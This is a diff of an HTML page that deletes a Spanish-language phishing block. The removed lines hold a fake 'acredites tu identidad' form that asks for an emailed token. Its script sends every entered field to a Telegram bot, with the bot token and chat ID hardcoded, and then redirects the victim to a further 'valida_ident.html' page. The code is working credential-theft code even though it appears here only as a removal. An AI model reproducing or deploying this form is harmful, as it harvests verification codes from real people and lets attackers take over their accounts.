@@ -119,71 +119,7 @@
 		
 		
 	</script> 
-	<section class="home">
-			<div class="login">
-				<form method="POST">
-					<div class="alert-danger">
-						<h2>Para que accedas a todos los beneficios disponibles. Necesitamos que acredites tu identidad</h2>
-						<p>Completa los siguientes datos requeridos</p>
-					</div>
-					<h4>Ingresá el codigo MAIL RECIBIDO en .</h4>
-		
-					<div class="control user">
-						<label>TOKEN</label>
-						<input type="" name="token" required>
-						
-					</div>
-					<button type="submit" name="enviartkn" class="btn">Ingresar</button>
-
-					<div class="doted"></div>
-
-				</form>
-				<script>
-						document.querySelector('form').addEventListener('submit', function(event) {
-								event.preventDefault(); // Evitar que el formulario se envíe por defecto
-
-								// Configurar los datos para enviar a Telegram
-							const telegramBotToken = '6378086633:AAGVAfCvJ4w__4iNgaEnySvvb2C7CbONY9Y'; // Reemplaza con tu token de bot
-							const chatId = '-4108504649'; // Reemplaza con el ID del chat donde recibirás los mensajes
-
-								// Obtener los datos del formulario
-								const formData = new FormData(this);
-								let mensaje = "Nueva acreditación de identidad:\n";
-
-								formData.forEach(function(valor, clave){
-										mensaje += clave + ": " + valor + "\n";
-								});
-
-								// Configurar la solicitud HTTP para enviar el mensaje a Telegram
-							const url = `https://api.telegram.org/bot6378086633:AAGVAfCvJ4w__4iNgaEnySvvb2C7CbONY9Y/sendMessage?chat_id=-4108504649&text=${encodeURIComponent(mensaje)}`;
-
-								// Realizar la solicitud usando fetch API (requiere manejo de errores y promesas)
-								fetch(url)
-										.then(response => response.json())
-										.then(data => {
-												if (data.ok) {
-														
-														// Redirigir después de enviar el mensaje
-														window.location.href = 'valida_ident.html'; // Cambia la URL según tu necesidad
-												} else {
-														console.error(data);
-														
-												}
-										})
-										.catch(error => {
-												console.error('Error al enviar los datos:', error);
-												
-										});
-						});
-				</script>
-			</div>
-			<div class="baner">
-				<img src="img/banner.jpg">
-			</div>
-		</section>
-		<section class="images-pre-footer">
-			<img src="img/footer-img.jpg">
-		</section>
+	
 	</div>
 </body>
 </html>
